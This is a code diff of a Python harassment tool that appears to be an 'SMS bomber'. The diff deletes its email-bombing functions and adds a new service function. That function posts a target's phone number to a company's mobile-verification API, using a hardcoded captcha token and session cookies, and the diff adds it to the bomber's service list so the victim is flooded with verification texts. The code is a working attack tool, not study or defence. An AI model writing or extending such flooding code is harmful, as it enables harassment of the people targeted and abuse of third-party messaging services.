@@ -57,63 +57,33 @@ random_messages = [
     "Good news! Our tool is working, and this message is proof.",
 ]
 
-# Send email
-def send_email(target_email, sender_email, sender_password, smtp_server="smtp.gmail.com", smtp_port=587, retries=3):
-    for attempt in range(retries):
-        try:
-            body = random.choice(random_messages)
-            msg = MIMEText(body)
-            msg['Subject'] = f"Test Message #{random.randint(1, 1000)}"
-            msg['From'] = f"Test Tool <{sender_email}>"
-            msg['To'] = target_email
-            msg['Reply-To'] = sender_email
-            
-            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
-            server.set_debuglevel(0)  
-            server.starttls()
-            server.login(sender_email, sender_password)
-            server.sendmail(sender_email, target_email, msg.as_string())
-            server.quit()
-            return True
-        except Exception as e:
-            if attempt < retries - 1:
-                sleep(2)
-            else:
-                print(f"{r}[Email Error] {a}Failed after {retries} attempts: {e}")
-                return False
-
-# Email bomber
-def email_bomber(target_email, sender_email, sender_password, count, delay):
-    if not check_internet():
-        print_slow(f"{r}[-] {y}No internet connection!")
-        sleep(2)
-        return
-    
-    print_slow(f"{p}╔═════[ Email Bombing Initiated ]═════╗")
-    print_slow(f"{g}Target: {y}{target_email}")
-    print_slow(f"{g}Payloads: {y}{count} emails")
-    print_slow(f"{g}Delay: {y}{delay}s")
-    print_slow(f"{p}╚═════════════════════════════════════╝")
-    sleep(1)
-
-    for i in range(count):
-        try:
-            Thread(target=send_email, args=(target_email, sender_email, sender_password)).start()
-            progress_bar(i + 1, count)
-            sys.stdout.write(f" {b}[+] {y}Email {i+1}/{count} Sent!\n")
-            sys.stdout.flush()
-            sleep(delay)
-        except KeyboardInterrupt:
-            print_slow(f"{r}[-] {y}Stopped by user!")
-            break
-    
-    print_slow(f"{g}[+] {y}Mission Completed!")
-    sleep(1)  
-    system('clear' if name == 'posix' else 'cls')  
-
 # ------------------------------
 # SMS services (only defined ones)
 # ------------------------------
+def okorosh(phone):
+    okJ = {
+    "mobile": "0"+phone.split("+98")[1],
+    "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
+}
+    okU = 'https://my.okcs.com/api/check-mobile'
+    okH = {'accept': 'application/json, text/plain, */*',
+'accept-encoding': 'gzip, deflate, br',
+'accept-language': 'en-US,en;q=0.9',
+'content-type': 'application/json;charset=UTF-8',
+'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
+'origin': 'https://my.okcs.com',
+'referer': 'https://my.okcs.com/',
+'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
+'x-requested-with': 'XMLHttpRequest',
+'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
+    try:
+        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
+        if 'success' in okR:
+            print(f'{g}(OfoghKourosh) {a}Code Was Sent')
+            return True #OfoghKourosh
+    except:
+        pass
+
 def snap(phone):
     snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
     snapD = {"cellphone": phone}
@@ -167,7 +137,7 @@ def mek(phone):
 
 # Simple SMS bomber
 def Vip(phone, Time):
-    services = [snap, gap, divar, alibaba, mek]  # فقط همین‌ها
+    services = [snap, gap, divar, alibaba, mek, okorosh]  # فقط همین‌ها
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
